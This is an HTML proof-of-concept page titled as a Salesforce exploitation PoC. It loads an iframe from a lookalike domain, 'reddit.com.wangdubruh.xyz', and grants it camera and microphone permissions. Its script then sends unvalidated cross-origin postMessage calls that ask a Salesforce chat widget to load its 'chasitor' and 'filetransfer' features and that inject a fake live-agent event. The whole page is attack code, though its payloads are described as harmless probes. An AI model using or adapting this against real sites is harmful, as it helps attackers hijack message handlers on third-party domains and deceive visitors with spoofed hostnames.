<!DOCTYPE html>
<html>
<head>
  <title>Salesforce Exploitation PoC</title>
</head>
<body>
  <h2>PoC: Controlled Message to Salesforce iframe</h2>

  <iframe
    id="eswFrame"
    src="https://reddit.com.wangdubruh.xyz"
    style="width:600px;height:400px;border:1px solid black"
    onload="runPoC()"
    allow="camera *; microphone *;"
  ></iframe>

  <script>
    function runPoC() {
      const iframe = document.getElementById("eswFrame").contentWindow;

      console.log("[+] Iframe loaded (Salesforce 4.0)");

      // Message 1: Load basic features
      ["chasitor", "filetransfer"].forEach(feature => {
        console.log(`ðŸ“¤ Sending script.load for feature: '${feature}'`);
        iframe.postMessage({ method: "script.load", feature }, "*");
      });

      // Message 2: Send a fake but harmless event to confirm message handling
      setTimeout(() => {
        console.log("ðŸ“¤ Sending fake liveagent.event to iframe");
        iframe.postMessage({
          method: "liveagent.event",
          data: {
            event: "customEventName",
            params: { key1: "value1", key2: "value2" }
          }
        }, "*");
      }, 1000);
    }
  </script>
</body>
</html>
